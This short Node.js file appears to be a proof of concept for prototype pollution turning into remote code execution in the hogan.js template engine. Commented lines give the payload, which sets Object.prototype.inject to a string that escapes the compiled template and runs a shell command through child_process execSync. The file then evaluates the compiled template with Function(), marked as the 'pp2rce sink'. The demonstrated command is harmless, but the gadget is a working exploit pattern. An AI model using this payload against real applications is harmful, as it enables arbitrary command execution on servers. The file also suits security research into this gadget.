const hogan = require("hogan.js");


/* Polluted Payload*/
// inject property to root prototype
// inject could be any string
// Object.prototype.name = '2';
// Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()}}//"

const TEMPLATE = `
<table border="1">
  <thead>
    <tr>
      <th>City</th>
      <th>Pollution index</th>
      <th>Year</th>
    </tr>
  </thead>
  <tbody>
  {{#data}}
    <tr>
      <td>{{city}}</td>
      <td>{{pollution}}</td>
      <td>{{year}}</td>
    </tr>
  {{/data}}
  {{^data}}
    Nothing found
  {{/data}}
  </tbody>
</table>
`;

var options = {'asString': true};    
const template = hogan.compile(TEMPLATE, options);

//pp2rce sink
Function(`return ${template}`)();
